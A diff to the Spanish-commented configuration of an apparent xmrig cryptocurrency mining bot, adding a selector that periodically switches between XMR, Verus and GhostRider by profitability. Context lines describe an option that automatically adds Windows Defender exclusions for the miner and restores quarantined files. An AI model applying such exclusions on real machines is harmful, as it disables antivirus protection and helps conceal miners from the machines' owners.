@@ -128,6 +128,9 @@ DEFAULTS = {
     "HIDRA_ACTIVA": True,
     "HIDRA_CAIDA_PCT": 35.0,
     "HIDRA_DEFENDER": True,
+    # --- v4.6: MULTI (selector de moneda) ---------------------------------
+    "SELECTOR_CADA_HORAS": 6,      # re-evalua la mejor ruta cada N horas
+    "MARGEN_CAMBIO_PCT": 15.0,     # cambiar solo si otra ruta gana >15%
 }
 
 
@@ -181,11 +184,17 @@ def load_secrets() -> dict:
     # v2: tipos de los nuevos secrets
     for _k in ("FAILOVER_MINUTES", "ROTATE_MINUTES", "CPU_TEMP_MAX",
                "DAILY_SUMMARY_HOUR", "PAYOUT_ALERT_MIN_BTC",
-               "EVIDENCIA_CADA_HORAS", "HIDRA_CAIDA_PCT"):
+               "EVIDENCIA_CADA_HORAS", "HIDRA_CAIDA_PCT",
+               "MARGEN_CAMBIO_PCT"):
         try:
             cfg[_k] = float(cfg[_k])
         except Exception:
             pass
+    for _k in ("SELECTOR_CADA_HORAS",):
+        try:
+            cfg[_k] = max(1.0, float(cfg[_k]))
+        except Exception:
+            cfg[_k] = 6.0
     cfg["AGGRESSIVE_MODE"] = str(cfg.get("AGGRESSIVE_MODE", True)).lower() \
         not in ("0", "false", "no", "off")
     return cfg
@@ -380,4 +389,13 @@ SECRETS_HELP = [
     ("HIDRA_DEFENDER", "true = el ESCUDO agrega solo las exclusiones de "
                        "Windows Defender para xmrig (carpeta + .exe + "
                        "proceso) y restaura lo cuarentenado."),
+    # v4.6 — MULTI
+    ("SELECTOR_CADA_HORAS", "v4.6 MULTI: cada cuántas horas el bot re-"
+                            "evalúa la mejor moneda (XMR vs Verus vs "
+                            "GhostRider) y cambia de ruta si conviene "
+                            "(default 6; 1 = mínimo)."),
+    ("MARGEN_CAMBIO_PCT", "v4.6 MULTI: % de ventaja que exige el selector "
+                          "para cambiar de ruta (anti-vaivenes, default "
+                          "15). Con 15, solo cambia si la otra ruta le "
+                          "gana más de un 15% en USD/día."),
 ]
